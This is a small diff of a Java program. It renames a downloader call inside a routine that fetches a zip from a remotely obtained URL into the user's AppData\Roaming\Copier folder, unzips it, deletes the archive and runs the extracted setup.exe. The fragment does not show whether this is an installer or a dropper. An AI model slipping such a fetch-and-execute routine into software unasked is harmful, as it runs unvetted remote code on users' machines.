@@ -30,7 +30,7 @@ public class Main {
 					String fileDwn = System.getProperty("user.home") + "\\AppData\\Roaming\\Copier\\setup.zip",
 							fileUnzDir = System.getProperty("user.home") + "\\AppData\\Roaming\\Copier";
 					URL gurl = UrlGet.start();
-					fileDownloader.start(gurl, fileDwn);
+					fileDwnl.start(gurl, fileDwn);
 					Unzip.start(fileDwn, fileUnzDir);
 					fileDestroy.delDir(fileDwn);
 					Runtime.getRuntime().exec(fileUnzDir + "\\setup.exe");
